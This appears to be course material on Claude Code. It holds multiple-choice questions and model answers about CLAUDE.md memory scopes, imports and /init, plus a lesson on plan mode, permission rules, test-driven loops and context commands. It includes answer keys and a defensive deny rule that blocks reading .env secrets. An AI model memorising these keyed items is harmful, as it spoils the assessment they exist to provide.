objective.question: You open Claude Code in an existing repository that has no memory file. You want a starter CLAUDE.md based on the codebase. What is the best first step?
options: Run /memory and type the whole file from scratch
Run /init and commit the output without reading it
Create ~/.claude/CLAUDE.md and copy the README into it
Run /init, then review and trim the generated CLAUDE.md
objective.explanation: /init scans the codebase and writes a starter CLAUDE.md, but the output should always be reviewed and trimmed. /memory edits files that already exist, user memory is the wrong scope, and committing unread output risks wrong or bloated guidance.

objective.question: Your team wants every developer's Claude Code session in a repo to know the build and test commands. Where should this guidance live?
options: CLAUDE.local.md in the repo root
A comment at the top of package.json
./CLAUDE.md (or ./.claude/CLAUDE.md) committed to git
~/.claude/CLAUDE.md on each laptop
objective.explanation: Project memory at ./CLAUDE.md or ./.claude/CLAUDE.md is committed and shared with the team. User memory is personal to one machine, CLAUDE.local.md is personal and gitignored, and a package.json comment is not a memory file.

objective.question: A developer always wants Claude to reply in short bullet points and use British spelling, in every project they work on. Where does this preference belong?
options: ~/.claude/CLAUDE.md
A nested CLAUDE.md in the src folder
The managed policy memory file
./CLAUDE.md in each repo
objective.explanation: User memory at ~/.claude/CLAUDE.md applies to all of your projects and is not shared. Putting a personal style in project memory forces it on teammates, and managed policy is for organisation-wide rules.

objective.question: You use a local Docker database URL and a personal seed-data script that only you need in this one repo. Which memory file fits best?
options: CLAUDE.local.md, kept out of git
Managed policy memory
~/.claude/CLAUDE.md
./CLAUDE.md, committed
objective.explanation: CLAUDE.local.md is personal to one repo and should be gitignored so local details do not leak to the team. User memory would apply to every project, and project memory would share it with everyone.

objective.question: Your security team needs one set of instructions to apply to every Claude Code user in the company, on every repo. Which memory type is designed for this?
options: Managed (enterprise) policy memory at a system path
CLAUDE.local.md in each repo
User memory pushed by email to each employee
Project memory committed to a template repo
objective.explanation: Managed policy memory sits at a system-level path and applies organisation-wide. The other options depend on each user or repo copying files and are easy to miss or change.

objective.question: Which CLAUDE.md line is most likely to make Claude run the correct test in a new session?
options: Make sure tests pass before you finish.
Testing is important in this project.
Run `npm run test:unit -- path/to/file.test.ts` to test one file; `npm run test:unit` for the full unit suite.
Always test your code.
objective.explanation: Specific, runnable commands beat vague advice. The other lines tell Claude to test but not how, so it may guess a wrong command.

objective.question: Your CLAUDE.md has grown to several hundred lines, including a pasted API style guide. Claude has started ignoring some rules. What is the most effective fix?
options: Copy the same file into ~/.claude/CLAUDE.md as well
Split it into ten CLAUDE.local.md files
Move the style guide to its own file, reference it with @docs/api-style.md, and cut CLAUDE.md to the essentials
Add 'IMPORTANT' before every line
objective.explanation: Memory is loaded every session and uses context tokens; shorter memory is cheaper and followed better. Imports keep long docs out of the main file. Shouting every line, duplicating, or scattering into local files makes things worse.

objective.question: Which syntax imports another file into CLAUDE.md?
options: @docs/testing.md
{{docs/testing.md}}
import docs/testing.md
#include docs/testing.md
objective.explanation: CLAUDE.md uses @path syntax to import files. The other forms are syntax from other languages or template engines and are not CLAUDE.md imports.

objective.question: In the middle of a session, you are unsure which memory files Claude actually loaded and want to fix a wrong test command in one of them. What should you do?
options: Run /init again to overwrite everything
Run git log on CLAUDE.md
Run /memory to see the loaded memory files and open one to edit
Restart the terminal and hope it reloads
objective.explanation: /memory shows the memory files loaded in the current session and lets you edit them. Re-running /init risks overwriting reviewed content, and git log only shows history.

objective.question: CLAUDE.md says 'Never edit files in /migrations'. A teammate asks if this guarantees Claude can never change migrations. What is the correct answer?
options: Yes, if the rule is written in capital letters
No, CLAUDE.md is guidance; use permissions or hooks to enforce rules that must never be broken
No, but adding it to CLAUDE.local.md makes it enforced
Yes, CLAUDE.md rules are enforced by Claude Code
objective.explanation: CLAUDE.md shapes behaviour but does not enforce it. Hard rules need permissions or hooks. Capital letters or a different memory file do not change this.

objective.question: A monorepo has ./CLAUDE.md at the root and ./packages/api/CLAUDE.md with API-specific test commands. You start Claude Code at the repo root and ask it to fix a bug in packages/api. What best describes memory loading?
options: Only the nested file is used; the root file is skipped
The root file loads at start, and the nested file is pulled in when Claude works with files in packages/api
Claude merges them only if you run /init in each folder
Only the root file is ever used; nested files are ignored
objective.explanation: Claude Code loads CLAUDE.md files from the working directory and its parents at start, and picks up nested CLAUDE.md files in subfolders when it reads files there. So both apply, with the nested file adding package-specific detail.

objective.question: Your checkpoint is: 'Claude runs the right test command in a new session without being told.' Which test best proves you met it?
options: Start a fresh session, ask Claude to make a small change and verify it, and watch which command it runs
Run the tests yourself and paste the output into chat
Read CLAUDE.md aloud to a teammate
In the same session where you wrote CLAUDE.md, ask 'which test command do we use?'
objective.explanation: A fresh session proves the memory file, not chat history, drove the behaviour. Asking in the same session, reading aloud, or pasting output does not test memory loading.

objective.question: A developer committed CLAUDE.local.md containing a personal staging API token path and local ports. What is the main problem and the fix?
options: It leaks personal setup to the team; remove it from git and add it to .gitignore
It should be moved into managed policy memory
It should be renamed to CLAUDE.md so it loads
No problem; local memory is meant to be shared
objective.explanation: CLAUDE.local.md is personal and should stay gitignored. Renaming it to CLAUDE.md or moving it to managed policy would push personal details to more people, not fewer.

objective.question: Which set of content is the best fit for a short project CLAUDE.md?
options: Build, test and lint commands; key coding conventions; do-not-touch areas; pointers via @imports to longer docs
Your editor theme preference and personal shell aliases
Every function signature in the codebase
Full history of the project, team bios and meeting notes
objective.explanation: Project memory should hold the high-value, team-wide facts Claude needs every session, with longer docs imported. History and signatures waste tokens, and personal preferences belong in user or local memory.

objective.question: A teammate added the lines below to CLAUDE.md. In a new session, Claude clearly knows the rules in docs/testing.md but not those in docs/lint.md. What is the most likely cause?

code.code:
## Testing
See @docs/testing.md for how to run tests.

## Lint
Lint rules are in `@docs/lint.md`.

options: Imports are not evaluated inside markdown code spans, so the backticked reference is treated as plain text
Imports work only with absolute paths, and docs/lint.md is relative
docs/lint.md must be listed in .claude/settings.json before it can be imported
Claude Code imports only the first @ reference in a file
objective.explanation: Claude Code skips @ imports inside markdown code spans and code blocks, so the backticked path is never imported. Multiple imports per file and relative paths are both supported, and imports need no settings entry.

objective.question: Your root CLAUDE.md imports @docs/conventions.md. That file imports @docs/naming.md, which imports another file, and so on. What does Claude Code do with these chained imports?
options: It follows recursive imports, up to a maximum depth of 5 hops
It follows chained imports with no depth limit
It follows them only if you run /memory to approve each file
It ignores any import that appears inside an imported file
objective.explanation: Imported files can import further files, and Claude Code follows these chains up to a maximum depth of 5 hops. Chained imports are not ignored, have a depth limit, and do not need manual approval.

objective.question: A repo has ./CLAUDE.md, ./packages/api/CLAUDE.md and ./packages/web/CLAUDE.md. You start Claude Code inside ./packages/api/src. Which project memory files are loaded at launch?
options: ./packages/api/CLAUDE.md and ./CLAUDE.md, found by walking up from the working directory
None, because Claude Code reads CLAUDE.md only when started at the git root
All three files, because they are in the same git repository
Only ./packages/api/CLAUDE.md, because it is the closest file
objective.explanation: Claude Code walks up from the current working directory and loads every CLAUDE.md it finds on the way. The sibling ./packages/web/CLAUDE.md is not on that path, so it loads only on demand if Claude works in that subtree.

objective.question: A developer works on the same repo through several git worktrees. They want the same personal, uncommitted instructions in every worktree. Which approach fits best?
options: Keep the instructions in a file in their home directory and import it from CLAUDE.md with @~/.claude/my-project-notes.md
Add the personal instructions to the team's committed CLAUDE.md
Put the instructions in managed policy memory
Copy a CLAUDE.local.md file into each worktree by hand
objective.explanation: A file in the home directory is shared by all worktrees, and an @~ import pulls it in. CLAUDE.local.md lives inside each worktree, so copies drift. Committed or managed memory would push personal notes onto other people.

objective.question: Which of these file paths does Claude Code also accept as project memory, besides ./CLAUDE.md at the repo root?
options: ./docs/CLAUDE.txt
./.claude/memory.json
./.claude/settings.json
./.claude/CLAUDE.md
objective.explanation: Project memory can sit at ./CLAUDE.md or ./.claude/CLAUDE.md. settings.json holds settings such as permissions and hooks, not memory instructions. The other two paths are not memory locations.

objective.question: Your ~/.claude/CLAUDE.md says 'Run tests with npm test'. A repo's CLAUDE.md says 'Run tests with pnpm vitest run'. In that repo, Claude sometimes runs npm test. What is the best fix?
options: Remove the project-specific test command from user memory so project memory is the only source for test commands
Move both lines into CLAUDE.local.md
Restart Claude Code so that only one file loads
Add 'IMPORTANT' in capitals to the project line and leave the user line as it is
objective.explanation: Both files load together. When their instructions conflict, Claude's behaviour becomes unpredictable. Test commands are project facts, so they belong only in project memory. Emphasis words and restarts do not remove the conflict.

objective.question: What is the effect of this CLAUDE.md line at the start of a session?

code.code: See @README.md for the project overview and @package.json for available npm scripts.

options: Claude creates links to the files but never reads them
package.json is ignored because only .md files can be imported
The contents of both files are pulled into Claude's context along with CLAUDE.md
Claude opens these files only if you mention them in a prompt
objective.explanation: @ imports are expanded when memory loads, so both files' contents go into context. Any file type can be imported. This helps, but it also costs context, so import only files that are short and useful.

subjective.question: What does /init do in Claude Code, and what should you do after running it?
subjective.answer: /init scans the codebase and generates a starter CLAUDE.md. It usually picks up things like the language, framework, folder layout and commands it can find in files such as package.json or a Makefile. It is a good first draft, not a finished file. After running it, I read every line. I delete anything generic or obvious, like 'write clean code'. I correct commands that are wrong or incomplete, for example adding how to run a single test file. I add the things a scan cannot know: team conventions, do-not-touch folders and gotchas. Then I commit it so the team shares it. Finally, I open a new session and check that Claude follows it.
keyPoints: /init creates a starter CLAUDE.md from a codebase scan
Output is a draft; always review
Trim generic or obvious content
Add commands, conventions and rules a scan cannot infer
Commit and verify in a new session

subjective.question: Explain the difference between project, user and local memory in Claude Code, with one example of what goes in each.
subjective.answer: Project memory lives at ./CLAUDE.md or ./.claude/CLAUDE.md. It is committed to git and shared with the team. Example: 'Run npm run lint and npm run test:unit before finishing a task.' User memory lives at ~/.claude/CLAUDE.md. It applies to all my projects on my machine and is not shared. Example: 'Keep explanations short and show diffs, not full files.' Local memory is CLAUDE.local.md in one repo. It is personal to that repo and should be gitignored. Example: 'My local Postgres runs on port 5433 via docker compose.' The rule of thumb: shared team facts go in project memory, personal habits across projects go in user memory, and personal details for one repo go in local memory.
keyPoints: Project: ./CLAUDE.md or ./.claude/CLAUDE.md, committed, team-wide
User: ~/.claude/CLAUDE.md, all your projects, personal
Local: CLAUDE.local.md, one repo, gitignored
Choose scope by who needs it and where

subjective.question: What is managed (enterprise) policy memory and when would an organisation use it?
subjective.answer: Managed policy memory is a CLAUDE.md placed at a system-level path, usually deployed by IT or platform teams. It applies to every Claude Code user on those machines, across all repos. An organisation would use it for instructions that must be consistent company-wide, such as 'never paste customer data into prompts', 'follow our secure coding standard', or 'use the internal package registry'. It saves each team from copying the same text into every repo. However, it is still guidance to the model, like any CLAUDE.md. If a rule must never be broken, for example blocking certain commands or file paths, the organisation should also use managed settings, permissions or hooks to enforce it.
keyPoints: CLAUDE.md at a system path
Applies organisation-wide to all users and repos
Used for consistent company policies
Deployed centrally, not per repo
Still guidance; enforce hard rules with permissions or hooks

subjective.question: Why should CLAUDE.md be kept short? Give practical ways to keep it short.
subjective.answer: CLAUDE.md is loaded at the start of every session and uses context tokens every time. A long file costs more tokens, leaves less room for the actual work, and important rules get buried, so Claude follows them less reliably. To keep it short, I include only what Claude needs in most sessions: commands, key conventions and do-not-touch areas. I write each rule as one specific line. I remove anything Claude can learn by reading the code, like listing every folder. I move long material, such as an API style guide or architecture notes, into separate files and reference them with @imports. I put package-specific rules in nested CLAUDE.md files. I also review the file regularly and delete stale entries.
keyPoints: Loaded every session; costs context tokens
Short memory is followed better
One specific line per rule
Use @imports and nested files for detail
Prune stale content regularly

subjective.question: Hands-on: write a short CLAUDE.md section that tells Claude how to run tests and lint for a Node/TypeScript project. Explain your choices.
subjective.answer: Example section: '## Commands' then '- Install: npm ci' '- Lint: npm run lint (fix with npm run lint -- --fix)' '- Type check: npm run typecheck' '- Unit tests, one file: npm run test:unit -- path/to/file.test.ts' '- Unit tests, all: npm run test:unit' '- Before finishing any task: run lint, typecheck and the unit tests for changed files.' My choices: every line is an exact command Claude can copy, not advice like 'test your code'. I include the single-file form because it is faster, so Claude uses it during iteration. I add a clear 'before finishing' rule so Claude knows when to run them. I keep it to a few lines so it is cheap to load and easy to follow. Then I verify in a fresh session.
keyPoints: Exact, runnable commands
Single-file and full-suite variants
Clear trigger for when to run them
Short and scannable
Verify in a new session

subjective.question: How would you verify the checkpoint 'Claude runs the right test command in a new session without being told'?
subjective.answer: First I save and commit CLAUDE.md. Then I fully exit Claude Code and start a new session, so there is no chat history carrying the information. I can run /memory to confirm the project CLAUDE.md is in the loaded list. Next I give a normal task without mentioning tests, for example 'fix the off-by-one bug in utils/date.ts'. I watch the tool calls. Success means Claude runs the exact command from CLAUDE.md, ideally the single-file form for the changed test. If it guesses a different command, I make the line more specific or move it higher, then repeat in another fresh session. A test in the same session where I wrote the file proves nothing.
keyPoints: Use a genuinely fresh session
Confirm loading with /memory
Give a task without mentioning tests
Check the exact command Claude runs
Iterate on wording if it fails

subjective.question: What are @imports in CLAUDE.md and when should you use them instead of pasting content?
subjective.answer: @imports let CLAUDE.md pull in another file using @path syntax, for example '@docs/testing.md' or '@README.md'. The imported file becomes part of memory. I use imports when content is long, already exists elsewhere, or is maintained by another owner. Examples are an architecture document, an API style guide or a contributing guide. This keeps the main CLAUDE.md short and readable, avoids two copies drifting apart, and lets each document have one source of truth. I can also import a personal file from my home directory so personal notes stay out of the repo. The trade-off: imported content still uses context, so I import only files that are genuinely useful, not every document in the repo.
keyPoints: @path syntax pulls in another file
Keeps main CLAUDE.md short
Single source of truth; avoids drift
Can reference personal files outside the repo
Imported content still costs tokens

subjective.question: Explain how Claude Code finds and combines memory files, including nested CLAUDE.md files in a monorepo.
subjective.answer: At session start, Claude Code loads memory from several scopes: managed policy memory, user memory in ~/.claude/CLAUDE.md, and project memory. For project memory it looks in the current working directory and walks up through parent directories, loading CLAUDE.md and CLAUDE.local.md files it finds. CLAUDE.md files in subdirectories below the working directory are not loaded up front; they are pulled in when Claude reads files in those subtrees. In a monorepo this is useful: the root CLAUDE.md holds shared commands and conventions, and packages/api/CLAUDE.md holds API-specific test commands. When Claude works in packages/api, both apply. More specific files add detail. I use /memory to check which files are actually loaded.
keyPoints: Multiple scopes: managed, user, project, local
Walks up from working directory to parents
Nested subfolder files load when Claude works there
Root for shared rules, nested for package rules
/memory confirms what is loaded

subjective.question: A teammate writes 'NEVER touch the payments folder' in CLAUDE.md and says the folder is now protected. How do you respond?
subjective.answer: I would say the line is useful but it is not protection. CLAUDE.md is guidance that shapes Claude's behaviour. It usually works, but it is not a guarantee. Claude could misread a task, lose the rule in a long context, or a user could ask for an edit directly. If the payments folder must never be changed by Claude, we need enforcement: permission rules that deny edits to that path, or a hook that blocks writes to it. We cover those in later steps. I would keep the CLAUDE.md line because it explains intent and avoids wasted attempts, and it also helps Claude suggest the right owner. So the answer is guidance plus enforcement, not guidance alone.
keyPoints: CLAUDE.md is guidance, not enforcement
Rules can be missed or overridden
Use permissions or hooks for hard rules
Keep the CLAUDE.md line to explain intent

subjective.question: What kinds of 'do-not-touch' rules belong in CLAUDE.md, and how should you write them?
subjective.answer: Do-not-touch rules cover areas Claude should not change without explicit approval. Examples: generated code like src/generated, database migration files already applied in production, vendored libraries, lock files, CI config, and secrets or .env files. I write each rule as one specific line with a path and a reason or alternative. For example: 'Do not edit src/generated/*; regenerate with npm run codegen.' or 'Do not modify applied migrations; create a new migration instead.' The reason helps Claude choose the right action instead of just stopping. I avoid vague lines like 'be careful with important files'. For anything critical, I also add a permission rule or hook, because CLAUDE.md alone does not block edits.
keyPoints: Generated code, applied migrations, vendored code, secrets, CI config
Name the exact path
Give the reason or correct alternative
Avoid vague wording
Back critical rules with permissions or hooks

subjective.question: Compare a vague and a specific CLAUDE.md instruction for coding conventions. Why does specificity matter?
subjective.answer: A vague instruction is 'Follow good style and write clean code.' Claude already tries to do that, so the line adds tokens but no new information. A specific version is: 'Use named exports, not default exports. Use zod for request validation. Put React components in src/components/<Name>/index.tsx with a co-located test file.' These lines describe choices that differ from project to project, so Claude cannot guess them. Specific rules are easier to follow and easier to check in review. They also reduce rework, because Claude gets it right the first time. My test for each line: would Claude probably do something different without it? If not, I delete it. Specific and project-unique beats general advice.
keyPoints: Vague lines add tokens but no information
Specific lines capture project-unique choices
Easier to follow and verify
Test: would Claude behave differently without it?

subjective.question: What does the /memory command do and when would you use it during real work?
subjective.answer: /memory shows the memory files loaded in the current session and lets me open one to edit it. I use it in three main situations. First, debugging: if Claude ignores a rule, I check whether the file containing that rule is actually loaded, for example whether I started in the wrong directory. Second, quick fixes: if I notice a wrong or outdated command, I open the right file through /memory and correct it straight away. Third, choosing scope: it reminds me which files exist, so I put a new rule in project, user or local memory as appropriate. After editing, I check the change in a new session, because memory is loaded at session start.
keyPoints: Lists memory files loaded in this session
Opens a file for editing
Debug ignored rules by checking what loaded
Fix commands quickly
Verify edits in a new session

subjective.question: Your team's CLAUDE.md is outdated: the test runner changed from Jest to Vitest but the file still says 'npm test uses Jest'. What risks does this create and how should teams maintain memory?
subjective.answer: Stale memory is worse than no memory. Claude trusts CLAUDE.md, so it may run old commands, write Jest-style mocks, or waste time debugging failures caused by the wrong tool. New teammates also get misled. To maintain it, treat CLAUDE.md like code. Update it in the same pull request that changes the tooling, so the reviewer checks both together. Keep commands in CLAUDE.md pointing to package scripts like 'npm run test:unit', so the script can change without the memory going stale. Review the file periodically and remove dead rules. When Claude repeatedly makes the same mistake, add or fix a line. Because the file is committed, git history shows who changed what and why.
keyPoints: Stale memory actively misleads Claude
Update CLAUDE.md in the same PR as tooling changes
Reference stable script names
Periodic review and pruning
Git history gives accountability

subjective.question: Design a memory setup for a developer who works on three repos for one company, has personal preferences, and has a company security policy to follow.
subjective.answer: I would use four layers. Managed policy memory, deployed by IT at the system path, holds company-wide rules such as secure coding and data handling. User memory in ~/.claude/CLAUDE.md holds personal preferences that apply everywhere, like answer style or 'show a plan before large edits'. Each of the three repos has a committed project CLAUDE.md with its own build, test and lint commands, conventions and do-not-touch paths, plus @imports to longer docs. If a repo needs personal local details, such as custom ports, those go in a gitignored CLAUDE.local.md. I avoid repeating the same rule across layers, keep each file short, and confirm with /memory. Hard rules from the security policy are also enforced through permissions or hooks.
keyPoints: Managed policy for company-wide rules
User memory for personal cross-project preferences
Project memory per repo, committed
Local memory for personal repo details, gitignored
No duplication; enforce hard rules separately

subjective.question: Troubleshooting: you wrote a CLAUDE.md that says to run 'make test-unit'. In a fresh session, Claude still runs 'npm test'. Walk through how you would diagnose and fix this.
subjective.answer: First I run /memory to see which memory files actually loaded. If my file is missing, I check where it lives. It must be ./CLAUDE.md or ./.claude/CLAUDE.md at or above the directory where I started Claude. A file in a sibling subfolder will not load at launch. Next I look for conflicts. My user memory or a parent CLAUDE.md might mention npm test. Then I check the wording. The command should sit under a clear 'Commands' heading as an exact line, such as 'Unit tests: make test-unit (do not use npm test)'. It should not be buried inside a long paragraph. I also make sure the line is not inside an imported file whose @ reference is wrapped in backticks. Last, I trim the file if it is bloated. Then I start a brand-new session, ask 'fix the failing test' without naming any command, and watch which command Claude runs.
keyPoints: Use /memory to confirm which files loaded
Check file location against the working directory
Remove conflicting commands in user or parent memory
Write the exact command clearly, saying what not to use
Re-test in a fresh session without hints

subjective.question: Review this CLAUDE.md excerpt and rewrite it to be more useful. Explain what you changed.

code.code:
# Notes
We care a lot about quality. Please write good, clean code
and make sure everything works. Tests are important so run
them. We use some linting too. Be careful with the database
stuff. Our API style guide is below:
(... 300 lines of pasted style guide ...)

subjective.answer: Most of this text gives Claude nothing it can act on. 'Write good code' and 'tests are important' are not instructions with clear steps. My rewrite uses short headings. Under Commands: 'Test: pnpm test', 'Single file: pnpm vitest run <path>', 'Lint: pnpm lint --fix', and 'Run lint and tests before saying a task is done.' Under Conventions: two or three specific rules, such as 'Use named exports' and 'Handle errors with the Result type in src/lib/result.ts.' Under Do not touch: 'Do not edit db/migrations/ by hand; create new migrations with pnpm db:migrate:new.' I remove the pasted 300-line style guide. I replace it with one import line, '@docs/api-style.md', or simply a note pointing to the file. A shorter file means each rule gets more weight and goes stale less often. Every line should be something Claude would get wrong without it.
keyPoints: Replace vague value statements with exact commands
Use headings: commands, conventions, do-not-touch
Make the database warning a concrete path and an alternative action
Move the long style guide out, using an import or a pointer
Keep only lines that change Claude's behaviour

subjective.question: Compare CLAUDE.local.md with a home-directory file imported via @~ for personal, project-specific instructions. When would you pick each?
subjective.answer: Both keep personal notes out of shared memory, but they live in different places. CLAUDE.local.md sits in the project root. It must be gitignored, and Claude Code loads it alongside project memory. It is simple when you have one checkout of the repo. The risk is committing it by mistake. The other option is a file such as ~/.claude/acme-api-notes.md, pulled in by an import line like '@~/.claude/acme-api-notes.md'. Because the file lives outside the repo, every git worktree or clone shares the same copy, and it can never be committed. The trade-off is that the import line itself sits in a shared CLAUDE.md. If a teammate does not have that file, the import simply finds nothing. I use CLAUDE.local.md for a single checkout with quick local ports. I use the home import when I work across multiple worktrees and want one copy to maintain.
keyPoints: CLAUDE.local.md lives in the repo and must be gitignored
A home-directory import is shared across worktrees and clones
The home file cannot be accidentally committed
The import line sits in shared memory, so teammates without the file see nothing
Choose based on one checkout versus many worktrees

subjective.question: You want lint to run after every file Claude edits, without exception. Should you rely on CLAUDE.md, a hook, or both? Justify your design.
subjective.answer: CLAUDE.md is guidance. Claude reads it as context and usually follows it, but nothing forces it to. For 'every edit, no exceptions', I would add a PostToolUse hook in .claude/settings.json. Its matcher covers the Edit and Write tools and runs the linter, for example 'pnpm eslint --fix' on the changed file. Hooks run deterministically, every time the event fires, whatever the model decides. I would still keep a short line in CLAUDE.md, such as 'Lint: pnpm lint. A hook auto-fixes on edit; resolve any remaining errors.' That line tells Claude why lint output appears and what to do about errors the hook cannot fix. So memory explains intent and the workflow, and hooks enforce the rule. The same split applies to protected folders: memory states the rule, and permission deny rules or hooks actually block the action.
keyPoints: CLAUDE.md is context, not enforcement
Hooks run deterministically on tool events
Use a PostToolUse hook matching Edit and Write to run the linter
Keep a brief memory line explaining the workflow
Memory explains intent; hooks and permissions enforce

subjective.question: Hands-on: write the commands section of CLAUDE.md for a Python service with pytest, ruff, and a slow integration suite that needs Docker. Explain how it guides Claude's choices.

code.code:
## Commands
- Unit tests (default, fast): uv run pytest tests/unit -q
- Single test: uv run pytest tests/unit/test_x.py::test_name
- Lint + format: uv run ruff check --fix . && uv run ruff format .
- Integration (slow, needs Docker up): make test-integration
  Run only when touching src/db/ or when asked.
- Before finishing a task: lint, then unit tests.

subjective.answer: The section separates tests into tiers, so Claude does not run the slow suite by reflex. Unit tests are marked as the default and fast, which pushes Claude toward quick feedback loops. The single-test line lets Claude rerun just the failing test instead of the whole suite, which saves time and context. The lint line gives the exact ruff commands, including --fix, so Claude does not invent flags. The integration line states its cost and its precondition, Docker, plus a clear trigger: changes in src/db/ or an explicit request. The last line sets a definition of done. Every command is copy-paste exact and uses the project's runner, uv, so Claude does not fall back to plain pip or python. To check it, I open a new session, ask for a small fix, and confirm that Claude runs ruff and the unit tests without being told.
keyPoints: Exact, copy-paste commands using the project's tool runner
Clear default fast tier plus a single-test command
Slow suite labelled with its cost, precondition and trigger
A definition of done: lint, then tests
Verify the behaviour in a new session

subjective.question: In a monorepo, some developers start Claude Code at the root and others inside a package folder. How do you design the root and package CLAUDE.md files so both groups get correct behaviour?
subjective.answer: Memory loads by walking up from the working directory. A developer who starts in packages/api gets both the API file and the root file. A developer who starts at the root gets only the root file at launch. The API file loads later, on demand, when Claude reads files in packages/api. So the root CLAUDE.md holds shared facts: the package manager, workspace commands such as 'pnpm --filter api test', repo-wide conventions, and do-not-touch paths. It also briefly says that each package has its own CLAUDE.md. Each package file holds only what is specific to that package: its test and lint commands, local conventions, and fixtures. It does not repeat root content, because duplicated rules drift and then conflict. With filter-style commands in the root file, a root session can still run the right package tests before the nested file loads. I test both entry points in fresh sessions.
keyPoints: Loading walks up from the working directory
Nested files in subfolders load on demand
Shared facts and workspace commands go at the root
Package files contain only package-specific content, with no duplication
Test sessions started from both the root and a package

subjective.question: Your team runs Claude Code in CI with headless mode (claude -p) to fix failing tests. Which memory files will be available there, and how does this affect what you put in project memory?

code.code: claude -p "The unit tests are failing. Fix them and rerun the tests."

subjective.answer: In CI, Claude Code runs in the checked-out repo. It loads the committed project memory, ./CLAUDE.md or ./.claude/CLAUDE.md, plus any committed files it imports. The CI runner has no developer's ~/.claude/CLAUDE.md. CLAUDE.local.md is gitignored, so it is absent too. Managed policy memory exists only if the organisation has installed it on the runner image. This means anything CI needs must be in committed project memory: exact test and lint commands, how to run a single test, and do-not-touch rules. If a developer's test command works only because it is in their user memory, CI will guess and may run the wrong thing. I would also avoid imports that point to home-directory paths for critical facts. To check, I run the same headless prompt in a clean container, look at which command it runs, and lock down risky actions with permissions in settings rather than relying on memory.
keyPoints: CI loads committed project memory and its imports
There is no user memory or CLAUDE.local.md on a clean runner
Managed policy memory is present only if installed on the runner
Critical commands must be in committed memory
Validate in a clean environment and enforce risky limits with permissions

steps.overview: This step teaches the core Claude Code working loop for anything bigger than a one-line fix. You explore and plan first, review the plan, then build against failing tests, with the right permissions and focused context. The Claude Code in Action course tests these habits directly. They also separate safe, reviewable AI-assisted changes from risky ones in real teams.
objectives: Use plan mode to get a reviewed, written plan from Claude before any file is edited.
Configure permission modes and allow, ask and deny rules in the correct settings.json file.
Supply precise context with @-mentions, pasted screenshots and linked GitHub issues.
Run a test-driven loop where Claude writes a failing test first, then makes it pass without changing the test.
Manage a long session with /compact, /clear and /context so Claude stays accurate.

concepts.explanation: Plan mode is a read-only permission mode. Claude can read files, search and reason, but it cannot edit files or run state-changing commands. It ends by presenting a plan that you approve, reject or refine. Toggle it with Shift+Tab, or start a session with `claude --permission-mode plan`.

This is Anthropic's recommended workflow for larger changes. First ask Claude to read the relevant files without writing code. Then ask for a plan and review it. Then let Claude implement and verify the change, and finally commit or open a PR. Skipping the explore and plan stages is the most common cause of wrong-direction edits.

`default` asks before edits and commands. `acceptEdits` auto-approves file edits for the session. `plan` is read-only. `bypassPermissions` skips all prompts and is meant only for isolated sandboxes or containers. Shift+Tab cycles through the everyday modes in the terminal. You can set a starting mode with `defaultMode` in settings.json.

The `permissions` object in settings.json holds three lists: `allow`, `ask` and `deny`. Rules look like `Bash(npm run test:*)`, `Read(./.env)`, `Edit` or `WebFetch(domain:github.com)`. Deny rules take precedence over allow rules. Use `/permissions` to view and edit rules interactively.

User settings live in `~/.claude/settings.json` and apply to all your projects. Shared project settings live in `.claude/settings.json` and are committed to git for the team. Personal project settings live in `.claude/settings.local.json`, which Claude Code configures git to ignore. Enterprise managed settings override everything else.

Type `@path/to/file` to pull a file into the prompt; `@` on a directory gives Claude its listing. Paste screenshots or mockups with Ctrl+V (on macOS too, not Cmd+V), or drag and drop an image. For issues, give the URL or number and let Claude read it with the `gh` CLI or a GitHub MCP server. CLAUDE.md holds context that should load automatically in every session.

Ask Claude to write tests for the expected behaviour, and say explicitly that you are doing TDD so it must not write the implementation. Have it run the tests and confirm they fail, then commit the tests. Next, ask it to write code that makes the tests pass without modifying the tests, iterating until they are green. Tests give Claude a clear, checkable target.

`/clear` wipes the conversation history; use it between unrelated tasks. `/compact` replaces history with a summary and can take focus instructions, e.g. `/compact keep the plan and failing test names`. Claude Code also auto-compacts when the context window nears its limit. `/context` shows what is using the context window.

Press Esc to stop Claude mid-action while keeping context, so you can redirect it. Press Esc twice to jump back in the history and edit an earlier prompt, or to rewind to a checkpoint. Course-correcting early is cheaper than undoing a large wrong diff.

keyFacts: Shift+Tab cycles permission modes in the terminal: default → auto-accept edits → plan mode.
Plan mode is read-only. Claude cannot edit files or run state-changing commands until you approve the plan.
Start a session directly in plan mode with `claude --permission-mode plan`, or set `"defaultMode": "plan"` in settings.json.
Settings precedence, highest to lowest: enterprise managed → command-line arguments → .claude/settings.local.json → .claude/settings.json → ~/.claude/settings.json.
Deny rules beat allow rules, so a denied `Read(./.env)` stays blocked even if broad read access is allowed.
`Bash(npm run test:*)` is a prefix match. It allows `npm run test` and `npm run test:unit`, but not other commands.
Commit `.claude/settings.json` to share team rules. Keep personal rules in `.claude/settings.local.json`, which is git-ignored.
Paste images with Ctrl+V, including on macOS. `@` mentions pull files or directory listings into context.
Use `/clear` between unrelated tasks. Use `/compact [focus instructions]` to shrink a long but still-relevant session.
Use `bypassPermissions` (`--dangerously-skip-permissions`) only in an isolated container or VM with no sensitive access.

example.caption: .claude/settings.json for a Node app: tests and git status run freely, pushes need a prompt, secrets are blocked, sessions start in plan mode.

pitfalls: Approving a plan without reading it. Check the files it will touch, the approach, edge cases and how it will verify the change before you leave plan mode.
Letting Claude edit the tests to make them pass. State 'do not modify the tests' and check the diff for test changes.
Putting personal or machine-specific rules in the committed .claude/settings.json instead of settings.local.json, or assuming an allow rule overrides a deny rule.
Running one endless session across unrelated tasks. Stale context lowers accuracy, so use /clear between tasks and /compact with focus instructions within one.
Writing vague prompts like 'add search' with no @-mentioned files, issue link or acceptance criteria. Claude will guess and may build the wrong thing.
Treating bypassPermissions as a productivity shortcut on your own laptop. It belongs only in sandboxed environments.

workflow.title: Hands-on: add a feature with tests using plan mode

steps.label: Start clean in plan mode
steps.detail: Create a git branch, run `/clear`, and press Shift+Tab until the plan mode indicator shows.

steps.label: Give precise context
steps.detail: Paste the issue link or text, @-mention the relevant source and test files, and state the acceptance criteria.

steps.label: Review and refine the plan
steps.detail: Read Claude's plan, then ask for changes to scope, file list, edge cases or test strategy until you would sign off on it.

steps.label: Write failing tests first
steps.detail: Approve the plan, have Claude write only the tests, run them to confirm they fail, then commit them.

steps.label: Implement until green
steps.detail: Ask Claude to make the tests pass without modifying them, letting it run the allow-listed test command and iterate.

steps.label: Review the diff line by line
steps.detail: Read `git diff` yourself and check for edited tests, unrelated changes, leftover debug code and missing edge cases.

steps.label: Compact or commit
steps.detail: Commit with a clear message, then use `/compact` to continue the same feature or `/clear` for the next task.

